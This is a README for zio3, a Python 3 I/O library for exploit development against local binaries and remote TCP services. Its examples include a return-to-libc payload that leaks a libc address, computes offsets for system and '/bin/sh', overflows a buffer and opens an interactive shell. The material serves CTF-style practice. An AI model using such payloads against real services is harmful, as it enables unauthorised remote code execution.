
zio
====

zio3 rewrite in python3. So when you use it, you need to think in python3. zio3 deal with bytes rather than str. Although it has several approaches to avoid bytes and str translations. But remember read series functions always return bytes!

`zio <https://github.com/zTrix/zio>`_ is an easy-to-use io library for pwning development, supporting an unified interface for local process pwning and TCP socket io.

The primary goal of `zio <https://github.com/zTrix/zio>`_ is to provide unified io interface between process stdin/stdout and TCP socket io. So when you have done local pwning development, you only need to change the io target to pwn the remote server.

The following code illustrate the basic idea.

.. code:: python

    from zio3 import *

    if you_are_debugging_local_server_binary:
        io = zio('./buggy-server')            # used for local pwning development
    elif you_are_pwning_remote_server:
        io = zio(('1.2.3.4', 1337))           # used to exploit remote service

    io.write(your_awesome_ropchain_or_shellcode)
    # hey, we got an interactive shell!
    io.interact()

License
=======

`zio3 <https://github.com/alset0326/zio3>`_ use `SATA License (Star And Thank Author License) <https://github.com/zTrix/sata-license>`_, so you have to star this project before using. Read the LICENSE.txt carefully.

Dependency
==========

 - Linux or OSX
 - Python 3.5, 3.6

Installation
============

This is a single-file project so in most cases you can just download `zio3.py <https://raw.githubusercontent.com/alset0326/zio3/master/zio3.py>`_ and start using.

pip is also supported, so you can also install by running 

.. code:: bash

    $ pip3 install git+https://github.com/alset0326/zio3.git

Examples
========
 
.. code:: python

    from zio3 import *
    io = zio('./buggy-server')
    # io = zio((pwn.server, 1337))

    for i in range(1337):
        io.writeline(b'add ' + bytes((i,)))
        io.read_until('>>')

    # directly using str in write is also supported
    io.write("add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " + "A" * 49 + "\nshow\n")
    io.read_until('A' * 49)
    libc_base = l32(io.read(4)) - 0x1a9960
    libc_system = libc_base + 0x3ea70
    libc_binsh = libc_base + 0x15fcbf
    payload = b'A' * 64 + l32(libc_system) + b'JJJJ' + l32(libc_binsh)
    io.write('info ' + payload + "\nshow\nexit\n")
    io.read_until(">>")
    # We've got a shell;-)
    io.interact()

Document
========

To be added... Please wait...

about line break and carriage return

Just don't read '\n' or '\r', use `readline()` instead

Thanks (Also references)
========================

 - `pexpect <https://github.com/pexpect/pexpect>`_ I borrowed a lot of code from here
 - `sh <https://github.com/amoffat/sh>`_
 - python subprocess module
 - TTY related
    - http://linux.die.net/man/3/cfmakeraw
    - http://marcocorvi.altervista.org/games/lkpe/tty/tty.htm
    - http://www.linusakesson.net/programming/tty/


